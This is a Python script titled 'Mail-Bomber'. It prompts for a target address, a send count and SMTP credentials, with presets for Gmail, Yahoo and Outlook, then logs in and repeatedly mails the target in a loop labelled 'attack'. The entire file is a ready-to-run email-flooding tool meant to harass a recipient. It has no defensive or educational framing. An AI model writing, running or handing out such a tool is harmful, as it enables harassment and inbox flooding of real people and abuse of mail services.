import smtplib
import sys
import time
def banner():
    print("Mail-Bomber")
class Email_Sender:
    count = 0

    def __init__(self):
        try:
            self.target = str(input('Enter target email <: '))
            self.mode = int(input('Enter SEND mode (1,2,3,4) || 1:(100) 2:(50) 3:(25) 4:(10) 5:(1) 6(custom) <: '))
            if int(self.mode) > int(6) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def sendemail(self):
        try:
            print('\nSetting up sender')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(100 - 1)
            elif self.mode == int(2):
                self.amount = int(50 - 1)
            elif self.mode == int(3):
                self.amount = int(25 - 1)
            elif self.mode == int(4):
                self.amount = int(10 - 1)
            elif self.mode == int(5):
                self.amount = int(1 - 1)
            else:
                self.amount = int(input('Choose a CUSTOM amount <: '))
            print(f'\nYou have selected send mode: {self.mode} and {self.amount + 1}')
            if self.mode == 6:
                self.amount = self.amount - 1 
        except Exception as error:
            print(f'ERROR: {error}')

    def email(self):
        try:
            print('\n+Setting up email')
            self.server = str(input('Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            
            if self.server not in premade:
                default_port = False
                self.port = int(input('Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input('Enter from address <: '))
            self.fromPwd = str(input('Enter from password <: '))
            self.subject = str(input('Enter subject <: '))
            self.message = str(input('Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        time.sleep(5)
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(f'SEND {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print('\nSending...')

        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print('\nSend finished')
        sys.exit(0)

if __name__=='__main__':
    banner()
    sender = Email_Sender()
    sender.sendemail()
    sender.email()
    sender.attack()
